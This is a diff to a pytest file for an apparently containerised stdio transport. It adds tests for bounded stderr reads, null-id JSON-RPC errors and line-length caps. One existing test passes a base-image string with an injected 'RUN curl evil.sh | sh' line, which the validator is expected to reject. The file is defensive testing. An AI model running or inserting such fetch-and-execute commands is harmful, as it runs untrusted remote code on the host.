@@ -1,3 +1,4 @@
+import io
 import shutil
 import subprocess
 import time
@@ -10,6 +11,7 @@ from agent_perimeter.transport.stdio import (
     ContainmentError,
     LaunchSpec,
     StdioTransport,
+    _bounded_tail,
     docker_args,
     two_phase_dockerfile,
 )
@@ -99,6 +101,22 @@ def test_two_phase_dockerfile_rejects_base_image_injection() -> None:
     network access (I5)."""
     with pytest.raises(ValueError, match="base_image"):
         two_phase_dockerfile(["npm", "install"], "node:20-slim\nRUN curl evil.sh | sh")
+
+
+# --- Fix round 2: New-1, a bounded stderr-tail read -------------------------
+
+
+def test_bounded_tail_never_reads_past_its_limit() -> None:
+    """New-1: the stderr excerpt embedded in an error message must come
+    from a bounded `read(limit)`, not a `read()[:limit]` slice — the
+    latter materializes the *entire* (attacker-inflated) stream in host
+    memory just to keep a 400-char tail, which a hostile server can scale
+    to a host OOM. A stream position left at exactly `limit` after the
+    call proves the rest of a 10 MiB payload was never touched."""
+    huge = io.StringIO("x" * (10 * 1024 * 1024))
+    tail = _bounded_tail(huge, limit=400)
+    assert len(tail) == 400
+    assert huge.tell() == 400
 
 
 # --- Docker-dependent tests --------------------------------------------------
@@ -229,6 +247,47 @@ def test_request_ignores_unmatched_messages_and_finds_its_response() -> None:
     assert result == {"echo": 1}
 
 
+_ID_NULL_ERROR_SERVER = (
+    "import json, sys\n"
+    "for line in sys.stdin:\n"
+    "    if not line.strip():\n"
+    "        continue\n"
+    "    reply = {\n"
+    "        'jsonrpc': '2.0',\n"
+    "        'id': None,\n"
+    "        'error': {'code': -32601, 'message': 'Method not found'},\n"
+    "    }\n"
+    "    print(json.dumps(reply), flush=True)\n"
+)
+
+
+@pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
+def test_id_null_error_frame_surfaces_immediately_not_discarded() -> None:
+    """New-2: JSON-RPC 2.0 mandates `id: null` on an error when the server
+    couldn't determine the request id — a legitimate response shape that
+    the id-correlation check must never silently discard. Discarding it
+    would burn the whole scan's wall-clock budget waiting for a match that
+    never comes, and lose the error `code` Task 8 depends on."""
+    transport = StdioTransport(
+        LaunchSpec(
+            image="python:3.12-slim",
+            command=["python3", "-c", _ID_NULL_ERROR_SERVER],
+            timeout_s=30,
+        )
+    )
+    started = time.monotonic()
+    try:
+        with pytest.raises(TransportError) as exc_info:
+            transport.request("ping")
+    finally:
+        transport.close()
+    elapsed = time.monotonic() - started
+
+    assert not isinstance(exc_info.value, ContainmentError)
+    assert exc_info.value.code == -32601
+    assert elapsed < 10, "must surface immediately, not after the wall-clock deadline"
+
+
 _GARBAGE_SERVER = (
     "import sys\n"
     "for line in sys.stdin:\n"
@@ -288,7 +347,15 @@ _UNBOUNDED_LINE_SERVER = (
 @pytest.mark.skipif(_DOCKER_UNAVAILABLE, reason="docker unavailable")
 def test_unbounded_response_line_is_capped_not_buffered_forever() -> None:
     """I4: a newline-free flood on stdout must hit a bound rather than
-    growing the host scanner process's memory without limit."""
+    growing the host scanner process's memory without limit.
+
+    `ContainmentError` is a `TransportError` subclass, so asserting only
+    `TransportError` here would pass identically whether the 512 KiB line
+    cap fired or the (10s) wall-clock deadline fired instead — it wouldn't
+    prove the cap did its job. Match the cap's specific message and rule
+    out `ContainmentError` so this only passes when the cap — not the
+    deadline — is what stopped it (it fires in ~2s, well under the 10s
+    budget)."""
     transport = StdioTransport(
         LaunchSpec(
             image="python:3.12-slim",
@@ -297,7 +364,8 @@ def test_unbounded_response_line_is_capped_not_buffered_forever() -> None:
         )
     )
     try:
-        with pytest.raises(TransportError):
+        with pytest.raises(TransportError, match="bytes without a newline") as exc_info:
             transport.request("ping")
     finally:
         transport.close()
+    assert not isinstance(exc_info.value, ContainmentError)
